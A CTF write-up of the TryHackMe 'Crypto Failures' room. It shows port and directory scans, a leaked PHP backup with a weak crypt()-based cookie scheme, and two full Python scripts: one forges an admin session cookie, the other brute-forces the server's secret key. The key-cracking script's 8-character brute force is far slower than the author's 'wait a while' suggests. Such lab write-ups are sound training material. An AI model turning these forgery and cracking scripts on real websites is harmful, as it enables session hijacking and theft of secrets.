---
title: "TryHackMe: Crypto Failures"
author: cilgin
date: 2025-07-02 15:43:16 +0300
categories: [CyberSecurity]
tags: [CTF, TryHackMe, Medium]
pin: true
math: false
mermaid: false
image:
  path: /assets/img/2025-07-02-TryHackMe-Crypto_Failures/main.png
---

hi I'm making <https://tryhackme.com/room/cryptofailures> room


---



```bash
export IP=10.10.183.237
```

```bash
❯ nmap -T4 -n -sC -sV -Pn -p- $IP
Starting Nmap 7.97 ( https://nmap.org ) at 2025-07-02 15:44 +0300
Nmap scan report for 10.10.183.237
Host is up (0.070s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 57:2c:43:78:0c:d3:13:5b:8d:83:df:63:cf:53:61:91 (ECDSA)
|_  256 45:e1:3c:eb:a6:2d:d7:c6:bb:43:24:7e:02:e9:11:39 (ED25519)
80/tcp open  http    Apache httpd 2.4.59 ((Debian))
|_http-title: Did not follow redirect to /
|_http-server-header: Apache/2.4.59 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 70.09 seconds
```

We can go to the web page via our browser and we can see this message:

```text
<p>You are logged in as guest:**********************************************************************
<p>SSO cookie is protected with traditional military grade en<b>crypt</b>ion
<!-- TODO remember to remove .bak files-->
```

Bro thinks his cookie just protected military grade encryption but it is probably not.
Also he gave some hint for me so firstly we need to fuzz the webserver with gobuster.

```bash
❯ gobuster dir -w common.txt -u http://$IP/ -x md,js,html,php,py,css,txt,bak -t 50 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.183.237/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,bak,md,js,html,php,py,css
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/config.php           (Status: 200) [Size: 0]
/index.php            (Status: 302) [Size: 0] [--> /]
/index.php.bak        (Status: 200) [Size: 1979]
/server-status        (Status: 403) [Size: 278]
Progress: 42651 / 42651 (100.00%)
===============================================================
Finished
===============================================================
```

As you can see bro gave me `/index.php.bak` lets read that file.

```bash
❯ curl $IP/index.php.bak > index.php.bak
```

Now we can read the php file and find out what it does.

```php
<?php
include('config.php');

function generate_cookie($user,$ENC_SECRET_KEY) {
    $SALT=generatesalt(2);
    
    $secure_cookie_string = $user.":".$_SERVER['HTTP_USER_AGENT'].":".$ENC_SECRET_KEY;

    $secure_cookie = make_secure_cookie($secure_cookie_string,$SALT);

    setcookie("secure_cookie",$secure_cookie,time()+3600,'/','',false); 
    setcookie("user","$user",time()+3600,'/','',false);
}

function cryptstring($what,$SALT){

return crypt($what,$SALT);

}


function make_secure_cookie($text,$SALT) {

$secure_cookie='';

foreach ( str_split($text,8) as $el ) {
    $secure_cookie .= cryptstring($el,$SALT);
}

return($secure_cookie);
}


function generatesalt($n) {
$randomString='';
$characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
for ($i = 0; $i < $n; $i++) {
    $index = rand(0, strlen($characters) - 1);
    $randomString .= $characters[$index];
}
return $randomString;
}



function verify_cookie($ENC_SECRET_KEY){


    $crypted_cookie=$_COOKIE['secure_cookie'];
    $user=$_COOKIE['user'];
    $string=$user.":".$_SERVER['HTTP_USER_AGENT'].":".$ENC_SECRET_KEY;

    $salt=substr($_COOKIE['secure_cookie'],0,2);

    if(make_secure_cookie($string,$salt)===$crypted_cookie) {
        return true;
    } else {
        return false;
    }
}


if ( isset($_COOKIE['secure_cookie']) && isset($_COOKIE['user']))  {

    $user=$_COOKIE['user'];

    if (verify_cookie($ENC_SECRET_KEY)) {
        
    if ($user === "admin") {
   
        echo 'congrats: ******flag here******. Now I want the key.';

            } else {
        
        $length=strlen($_SERVER['HTTP_USER_AGENT']);
        print "<p>You are logged in as " . $user . ":" . str_repeat("*", $length) . "\n";
	    print "<p>SSO cookie is protected with traditional military grade en<b>crypt</b>ion\n";    
    }

} else { 

    print "<p>You are not logged in\n";
   

}

}
  else {

    generate_cookie('guest',$ENC_SECRET_KEY);
    
    header('Location: /');


}
?>
```

If you looked the file yourself you can see that bro tried to implement some encryption by himself. 

Lets crack get the flag using this python script:

```python
import requests
import sys

# The 'crypt' module is needed, but it's not on Windows.
try:
    import crypt
except ImportError:
    print("Bummer, the 'crypt' module isn't on your system. This script won't work on Windows.")
    sys.exit(1)

# --- Point it at the target ---
IP = "10.10.183.237"
URL = f"http://{IP}/"
USER_AGENT = "AA" # A simple User-Agent to keep things predictable

print("Alright, let's get admin access.")

# 1. Get a guest cookie to work with
print(">> Knocking on the door as 'guest' to grab a cookie...")
s = requests.Session()
s.headers.update({'User-Agent': USER_AGENT})
res = s.get(URL, allow_redirects=False)
guest_cookie = s.cookies.get('secure_cookie')

if not guest_cookie:
    print("!! Didn't get a cookie. Is the server up?")
    sys.exit(1)

# 2. Forge the admin cookie
salt = guest_cookie[:2]
cookie_tail = guest_cookie[13:] # The part of the cookie we're keeping
print(f">> Got the salt: '{salt}'. Now to forge the admin part.")

admin_first_chunk = "admin:" + USER_AGENT
admin_first_block = crypt.crypt(admin_first_chunk, salt)
forged_cookie = admin_first_block + cookie_tail

# 3. Use the forged cookie to get the flag
print(">> Sending the forged cookie... let's see if it works.")
cookies = {'user': 'admin', 'secure_cookie': forged_cookie}
res = requests.get(URL, headers={'User-Agent': USER_AGENT}, cookies=cookies)

print("\n----------------- SERVER RESPONSE -----------------")
print(res.text.strip())
print("---------------------------------------------------")
```

If you use this script you will get the flag.
But we need more we need the key. Key is little hard to find but you can use this script to get the key: 



```python
import requests
import sys
import itertools
import string

# The 'crypt' module is needed, but it's not on Windows.
try:
    import crypt
except ImportError:
    print("Bummer, the 'crypt' module isn't on your system. This script won't work on Windows.")
    sys.exit(1)

# --- Point it at the target ---
IP = "10.10.183.237"
URL = f"http://{IP}/"
USER_AGENT = "AA"

CHARSETS = [
    string.printable
]

def crack_chunk(salt, target_hash, length, prefix=""):
    """Tries to find the plaintext for a single hash."""
    for charset in CHARSETS:
        for p in itertools.product(charset, repeat=length):
            guess = "".join(p)
            if crypt.crypt(prefix + guess, salt) == target_hash:
                print(f" -> Found: '{guess}'")
                return guess
    return None

print("Okay, admin is nice, but they want the key. Let's find it.")
print(">> Grabbing a fresh cookie to analyze...")

res = requests.get(URL, headers={'User-Agent': USER_AGENT}, allow_redirects=False)
cookie = res.cookies.get('secure_cookie')
salt = cookie[:2]

if not cookie:
    print("!! Didn't get a cookie. Is the server up?")
    sys.exit(1)

print(f">> Got the salt: '{salt}'. Time to crack the key, chunk by chunk.")

found_key = ""
chunk_num = 1
cookie_ptr = 13 # Skip the first block ("guest:AA")

while cookie_ptr < len(cookie):
    target = cookie[cookie_ptr : cookie_ptr + 13]
    
    print(f"\n>> Working on key chunk #{chunk_num} (target hash: {target})")
    
    # First part of the key is 7 chars long and prefixed with ':'
    if chunk_num == 1:
        part = crack_chunk(salt, target, 7, prefix=":")
    else: # Subsequent parts are 8 chars long
        part = crack_chunk(salt, target, 8)
        
    if part:
        found_key += part
        chunk_num += 1
        cookie_ptr += 13
    else:
        print("\n!! Cracking failed. The key might use weird characters. Aborting.")
        sys.exit(1)

print("\n=======================================")
print(f"  Jackpot! The secret key is:")
print(f"  {found_key}")
print("=======================================")
```


This script is brute forcing the key so you need to wait a while to complete.
